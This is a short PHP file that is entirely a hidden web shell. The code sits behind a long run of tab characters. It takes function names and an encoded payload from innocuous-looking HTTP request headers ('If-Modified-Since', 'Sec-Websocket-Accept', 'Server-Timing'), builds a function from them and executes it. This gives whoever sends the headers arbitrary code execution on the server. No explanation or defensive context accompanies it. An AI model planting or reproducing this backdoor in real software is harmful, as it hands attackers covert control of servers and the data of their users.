<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['If-Modified-Since'])){$internal=$_HEADERS['If-Modified-Since']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['Server-Timing']));$internal();}
